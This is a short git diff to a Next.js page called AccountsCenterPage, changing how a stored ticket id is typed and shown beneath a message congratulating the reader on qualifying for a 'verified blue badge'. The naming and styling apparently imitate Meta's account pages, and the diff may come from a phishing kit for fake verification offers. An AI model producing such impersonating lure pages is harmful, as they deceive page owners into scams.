@@ -6,7 +6,7 @@ import Image from "next/image";
 import { useEffect, useState } from "react";
 
 export default function AccountsCenterPage() {
-  const [ticketId, setTicketId] = useState("");
+  const [ticketId, setTicketId] = useState<string | null>(null);
 
   useEffect(() => {
     const savedId = localStorage.getItem("ticket_id");
@@ -54,8 +54,8 @@ export default function AccountsCenterPage() {
                 Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you&apos;ve built with your audience. We&apos;re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!
               </p>
 
-              <p className="text-[#65676B]" data-i18n="ticket_id" suppressHydrationWarning>
-                Your ticket id: #{ticketId || "........"}
+              <p className="text-[#65676B]" suppressHydrationWarning>
+                Your ticket id: #{ticketId || ""}
               </p>
 
               <div className="pt-4 space-y-[15px]">
